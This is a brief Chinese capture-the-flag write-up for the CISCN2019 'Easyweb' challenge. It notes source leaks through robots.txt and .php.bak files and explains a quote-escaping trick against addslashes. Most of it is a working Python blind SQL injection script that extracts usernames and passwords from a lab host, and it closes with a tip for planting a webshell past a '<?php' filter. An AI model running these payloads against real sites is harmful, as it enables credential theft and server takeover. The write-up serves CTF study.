# WP
[[CISCN2019 总决赛 Day2 Web1]Easyweb](https://www.jianshu.com/p/e0e59ed2d6d2)
# 知识点
信息泄露 robots.txt    *.php.bak<br />sql注入  通过`addslashes`和`$id=str_replace(array("\\0","%00","\\'","'"),"",$id);`巧妙制造出`\`来转义`'`从而实现闭合。
```python
import time
import requests

url = 'http://b9f6ddb6-bb4e-48eb-857d-cc1a37b355d8.node4.buuoj.cn:81/image.php'
str = ''
for i in range(60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        # print(min, max, j)
        if(min == j):
            str += chr(j)
            print(str)
            break

        payload = fr"?id=\0&path=%20or%20if(ascii(substr((select%20group_concat(username,0x7e,password)%20from%20users),{i},1))<{j},1,0)%23"

        time.sleep(0.3)
        r = requests.get(url=url+payload).content
        # print(len(r))
        if len(r) > 0:
            max = j
        else:
            min = j
```
写入shell，`<?php`改为`<?=`
